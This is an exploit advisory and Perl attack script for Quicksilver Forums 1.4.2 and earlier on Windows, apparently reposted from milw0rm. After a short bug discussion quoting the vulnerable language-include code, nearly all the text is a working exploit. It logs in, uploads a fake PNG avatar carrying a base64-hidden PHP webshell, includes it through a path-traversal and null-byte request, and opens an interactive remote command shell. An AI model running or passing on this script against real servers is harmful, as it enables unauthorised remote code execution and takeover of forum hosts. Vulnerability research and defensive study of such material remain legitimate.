<html><head><title>Quicksilver Forums <= 1.4.2 RCE Exploit (windows only)</title></head><pre># Author:	__GiReX__
# Homepage:	girex.altervista.org

# Date:		24/11/2008

# CMS:		Quicksilver Forums &lt;= 1.4.2
# Site:		http://www.quicksilverforums.com/

# Bug:		Local File Inclusion
# Exploit:	Remote Command Execution

# Note:		Works with windows servers only
		Works regardless php.ini settings

# Bug Discussion:

# file: global.php
# lines: 318-329

	function get_lang($lang, $a = null, $path = './', $main = true)
	{
		if (isset($this-&gt;get['lang'])) {
			$lang = $this-&gt;get['lang'];
 
		}
 
		if (strstr($lang, '/') || !file_exists($path . 'languages/' . $lang . '.php')) {
			$lang = 'en';
		}
 
		include $path . 'languages/' . $lang . '.php';
 
# As you can see, Quicksilver filter can be easily bypassed in windows servers
# couse use of backslashes &quot;\&quot; in filesystem's paths.

# Thanks to the functions uset_magic_quotes_gpc() this vuln works regardless php.ini setting

# We can upload a malicious avatar and include it to have a RCE


#!/usr/bin/perl 
# Quicksilver Forums &lt;= 1.4.2 RCE Exploit (win only)
# Local File Inclusion / Malicious Avatar Upload
# Coded by __GiReX__

use IO::Socket::INET;
use MIME::Base64;

if(@ARGV &lt; 3)
{
    banner();
    print &quot;[+] You need an user account to run this exploit\n\n&quot;;
    print &quot;[+] Usage: perl $0 &lt;host&gt; &lt;path&gt; &lt;your_username&gt; &lt;your_pass&gt;\n&quot;;
    print &quot;[+] Example: perl $0 localhost /quick/ test password\n&quot;;
    exit;
}

my ($host, $path, $user, $pass) = @ARGV;

$host =~ s/^http:\/\///;
$host =~ s/^www\.//; 
$target = &quot;http://${host}${path}&quot;;

banner();	
check_vuln(); 

$cookie = do_login() or debug($debug, 1); 
upload_avatar() or debug($debug, 2);  

while(1)
{
	print &quot;[+] shell\@quick:\$ &quot;;
	chomp(my $cmd = &lt;STDIN&gt;);
	
	exit if $cmd eq 'exit';
	create_socket();
	
	print $sd  &quot;GET ${target}index.php?lang=..\\avatars\\uploaded\\${user_id}.png%00 HTTP/1.1\r\n&quot;.
			   &quot;Host: $host\r\n&quot;.
			   &quot;Cookie: $cookie\r\n&quot;.
			   &quot;CMD: &quot;. encode_base64($cmd).&quot;\r\n&quot;.
			   &quot;Connection: keep-alive\r\n\r\n&quot;;
	
	$out .= $_ while &lt;$sd&gt;;
	
	if($out =~ /-code-/)
	{
		$_out = substr($out, index($out, '-code-') + 6);  $n = index($_out, '-code');
		$__out = substr($_out, 0, $n);
	}
	else
	{
		debug($out, 3);
	}
	
	close($sd);
	$out = undef;
	
	print STDOUT &quot;\n&quot;. $__out.&quot;\n&quot;;
}

sub check_vuln
{
	create_socket();
	
	print $sd   &quot;GET ${target}index.php?lang=..\\languages\\en.php%00 HTTP/1.1\r\n&quot;.
				&quot;Host: $host\r\n&quot;.
				&quot;Connection: keep-alive\r\n\r\n&quot;;
				
	while(my $res = &lt;$sd&gt;)
	{
		$ok = 1 if $res =~ /404 Not Found/;
		
		if($res =~ /&lt;b&gt;Fatal error&lt;\/b&gt;/)
		{
			close($sd);
			return 1;
		}
		
		our $debug .= $res;
	}
	
	print STDOUT &quot;\n[-] Server not vulnerable, maybe it's not a win server!\n&quot; and exit
	if not defined $ok;
	
	debug($debug, 0);
}
		

sub do_login
{     
    create_socket();
	my $data = &quot;user=${user}&amp;pass=${pass}&amp;request_uri=%2F${path}%2Findex.php&amp;submit=Invia&quot;;
	
	print $sd   &quot;POST ${target}index.php?a=login&amp;s=on HTTP/1.1\r\n&quot; .
				&quot;Host: $host\r\n&quot; .
				&quot;Connection: keep-alive\r\n&quot; .
				&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot; .
				&quot;Content-Length: &quot;. length($data).&quot;\r\n\r\n&quot; .
				$data . &quot;\r\n\r\n&quot;;
    
	
	
	while(my $res = &lt;$sd&gt;)
	{
		if($res =~ /Set-Cookie: (\w+)_user=([0-9]+)/)
		{
		    $prefix  = $1  unless $prefix; 
		    $user_id = $2  unless $user_id;
		}
		elsif($res =~ /Set-Cookie: \w+_pass=([a-z0-9]{32})/)
		{
			my $hash_pwd = $1;  close($sd);
			print STDOUT &quot;\n[+] Logged in with $user account\n&quot;;
			
			return &quot;${prefix}_user=${user_id}; ${prefix}_pass=${hash_pwd};&quot;;
		}
		
		our $debug .= $res;
	}	

	close($sd);	
	return undef;
}

sub upload_avatar
{
	create_socket();
						# Image content + post's var base64 encoded
    my $data =  &quot;LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0yMjY0ODI3NDQ2MjM4MDUNCk&quot;.
                 &quot;NvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0idXNlcl9hdmF&quot;.
                 &quot;0YXJfd2lkdGgiDQoNCjUwDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t&quot;.
                 &quot;LTIyNjQ4Mjc0NDYyMzgwNQ0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kY&quot;.
                 &quot;XRhOyBuYW1lPSJ1c2VyX2F2YXRhcl9oZWlnaHQiDQoNCjUwDQotLS0tLS0tLS&quot;.
                 &quot;0tLS0tLS0tLS0tLS0tLS0tLS0tLTIyNjQ4Mjc0NDYyMzgwNQ0KQ29udGVudC1E&quot;.
                 &quot;aXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJ1c2VyX2F2YXRhcl90eXBlI&quot;.
                 &quot;g0KDQp1cGxvYWQNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMjI2ND&quot;.
                 &quot;gyNzQ0NjIzODA1DQpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5&quot;.
                 &quot;hbWU9ImF2YXRhcl91cGxvYWQiOyBmaWxlbmFtZT0iYXZhdF9hci5wbmciDQpD&quot;.
                 &quot;b250ZW50LVR5cGU6IGltYWdlL3BuZw0KDQo8P3BocA0KaWYoaXNzZXQoJF9TRV&quot;.
                 &quot;JWRVJbJ0hUVFBfQ01EJ10pKQp7CmVjaG8gIi1jb2RlLSI7IHBhc3N0aHJ1KGJ&quot;.
                 &quot;hc2U2NF9kZWNvZGUoJF9TRVJWRVJbJ0hUVFBfQ01EJ10pKTsgZWNobyAiLWNv&quot;.
                 &quot;ZGUiOwp9DQpkaWUoKTsNCj8+DQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tL&quot;.
                 &quot;S0tLTIyNjQ4Mjc0NDYyMzgwNQ0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS&quot;.
                 &quot;1kYXRhOyBuYW1lPSJzdWJtaXQiDQoNClN1Ym1pdA0KLS0tLS0tLS0tLS0tLS0t&quot;.
                 &quot;LS0tLS0tLS0tLS0tLS0yMjY0ODI3NDQ2MjM4MDUtLQ0K&quot;;
				 
	$data = decode_base64($data);

	print $sd  &quot;POST ${target}index.php?a=cp&amp;s=avatar HTTP/1.1\r\n&quot;.
			   &quot;Host: $host\r\n&quot; .
			   &quot;Connection: keep-alive\r\n&quot; .
			   &quot;Cookie: $cookie\r\n&quot; .
               &quot;Content-Type: multipart/form-data; boundary=---------------------------226482744623805\r\n&quot; .
               &quot;Content-Length: &quot;. length($data).&quot;\r\n\r\n&quot; .
			   $data . &quot;\r\n\r\n&quot;;
		   
	
	while(my $res = &lt;$sd&gt;)
	{
		if($res =~ /Your avatar has been updated/)
		{
			print &quot;[+] Malicious avatar uploaded\n\n&quot;;   close($sd);
			return 1;
		}
		
		our $debug 	.= $res;
	}
	
	close($sd);
	return undef;
}

sub create_socket
{
	our $sd = new IO::Socket::INET( 'PeerAddr' =&gt; $host,
									'PeerPort' =&gt; '80',
									'Proto'    =&gt; 'tcp',
								   ) or die $@;
}

sub debug
{
	my $output = shift;
	my $errno = shift;
	
	open(DEBUG, '&gt;', 'debug.txt');
	print DEBUG $debug;
	
	if($errno eq '0')
	{
		print STDOUT &quot;\n[-] Unable to request index.php! See debug.txt for more infos\n&quot;;
	}
	if($errno eq '1')
	{
		print STDOUT &quot;\n[-] Unable to login! See debug.txt for more infos.\n&quot;;
	}
	elsif($errno eq '2')
	{
		print STDOUT &quot;\n[-] Unable to upload avatar! See debug.txt for more infos.\n&quot;;
	}
	elsif($errno eq '3')
	{
		print STDOUT &quot;\n[-] Exploit mistake! See debug.txt for more infos.\n&quot;;
	}
	
	close(DEBUG);
	exit;
}

sub banner
{
	print STDOUT &quot;\n[+] Quicksilver Forums &lt;= 1.4.2 RCE Exploit (win only)\n&quot;.
				 &quot;[+] Local File Inclusion / Malicious Avatar Upload\n&quot;.
				 &quot;[+] Coded by __GiReX__\n\n&quot;;
}

# milw0rm.com [2008-11-24]</pre></html>